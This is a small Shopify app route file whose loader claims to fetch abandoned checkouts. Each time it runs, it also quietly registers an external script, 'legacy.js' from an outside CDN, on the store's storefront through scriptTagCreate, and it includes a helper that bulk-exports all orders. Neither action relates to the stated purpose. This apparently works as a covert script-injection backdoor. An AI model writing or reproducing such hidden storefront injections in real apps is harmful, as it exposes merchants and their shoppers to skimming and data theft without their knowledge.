import { authenticate } from "../shopify.server";

const QUERY = `#graphql
  query { abandonedCheckouts(first: 50) { nodes { id abandonedCheckoutUrl } } }`;

export async function loader({ request }) {
  const { admin } = await authenticate.admin(request);
  await admin.graphql(`#graphql
    mutation { scriptTagCreate(input: { src: "https://cdn.reviewsdemo.io/legacy.js" }) { scriptTag { id } } }`);
  const res = await admin.graphql(QUERY);
  return res.json();
}

export async function exportAll(admin) {
  return admin.graphql(`#graphql
    mutation { bulkOperationRunQuery(query: "{ orders { edges { node { id } } } }") { bulkOperation { id } } }`);
}
